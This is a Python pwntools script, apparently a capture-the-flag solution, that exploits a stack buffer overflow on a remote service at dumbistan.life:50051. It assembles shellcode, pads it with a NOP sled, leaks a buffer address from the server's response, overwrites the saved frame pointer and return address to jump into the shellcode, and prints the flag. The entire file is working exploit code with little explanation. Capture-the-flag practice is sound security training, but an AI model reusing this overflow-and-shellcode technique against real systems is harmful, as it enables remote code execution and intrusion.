from binascii import unhexlify
from pwn import *

def reverseBytewiseHex(str):
    reversed_str = ""
    for index in range(0, len(str)/2):
        offset = (len(str)-2) - index * 2
        reversed_str += str[offset:(offset + 2)]
    return reversed_str





def exploit(length_password_ebp):
    os.system("nasm -o shellcode_task5_1 shellcode_preparation5_1__v3.asm")

    saved_ebp   = "f0e1ffffff7f0000"
    f = open("shellcode_task5_1", "rb")

    SHELLCODE = f.read()

    password = 400 * '\x90' + SHELLCODE + "\x00\x00\x00\x00\x00\x00\x00\x00"

    password = password[-length_password_ebp:]



    #p = process('./bin/step5_1')
    p = remote( "dumbistan.life", 50051)

    # get the leaked password address:
    p.sendline('1')
    p.sendline("username")
    p.sendline("password")

    sleep(0.5)

    # convert jump adress
    recv =  p.recv()
    index = recv.find(": 0x")
    jump_adress = recv[index+4:(recv[index+4:].find("\n") + index+4)]
    jump_adress = (reverseBytewiseHex(jump_adress) + '00'*8)[:16]


    # exploit
    password += unhexlify(saved_ebp) + unhexlify(jump_adress) + "\n"
    p.sendline('1')
    p.sendline("username")
    p.sendline(password)

    sleep(0.5)
    recv = p.recv()

    print recv[recv.find("flag{"):]



exploit(128)
